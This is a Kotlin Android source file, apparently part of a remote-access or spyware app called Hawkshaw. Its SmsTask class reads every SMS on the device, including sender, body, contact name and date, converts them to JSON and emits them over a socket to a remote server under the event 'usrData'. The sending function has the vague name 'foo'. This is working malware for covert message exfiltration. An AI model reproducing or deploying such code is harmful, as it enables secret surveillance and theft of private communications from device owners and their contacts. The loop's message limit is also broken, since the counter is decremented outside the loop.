package me.hawkshaw.tasks

import android.Manifest
import android.content.Context
import android.content.pm.PackageManager
import android.net.Uri
import android.support.v4.content.ContextCompat
import com.google.gson.Gson
import io.socket.client.Socket
import me.hawkshaw.models.Sms
import org.json.JSONObject
import java.text.SimpleDateFormat
import java.util.*
import kotlin.collections.ArrayList

class SmsTask(private val ctx: Context, private var arg1: Int = 100, private val socket: Socket) : BaseTask(ctx) {

    private fun getAllSms(): ArrayList<Sms> {

        val smsList = ArrayList<Sms>()
        val smsUri = Uri.parse("content://sms/")
        val cur = ctx.contentResolver.query(smsUri, null, null, null, "date DESC")

        while (cur.moveToNext() && arg1 > 0) {
            val address = cur.getString(cur.getColumnIndex("address"))
            val body = cur.getString(cur.getColumnIndexOrThrow("body"))
            val type = cur.getString(cur.getColumnIndex("type"))
            val millis = cur.getString(cur.getColumnIndex("date"))
            val threadId = cur.getString(cur.getColumnIndex("thread_id"))
            val id = cur.getString(cur.getColumnIndex("_id"))

            val formatter = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.ENGLISH)
            val d = Date(millis.toLong())
            val date = formatter.format(d)


            val sms = Sms(id, threadId, address, getContactName(address), body, date, type)
            smsList.add(sms)
        }

        cur.close()
        arg1--

        return smsList
    }

    private fun getJSON(list: ArrayList<Sms>): String {
        return Gson().toJson(list)
    }

    private fun uploadSms(): String {
        return getJSON(getAllSms())
    }

    override fun run() {
        super.run()
        if (ContextCompat.checkSelfPermission(ctx, Manifest.permission.READ_SMS) == PackageManager.PERMISSION_GRANTED) foo(uploadSms())
        else requestPermissions()
    }

    private fun foo(str: String) {
        val data = JSONObject()
        data.put("sms", str)
        data.put("dataType", "sms")

        socket.emit("usrData", data)
    }
}
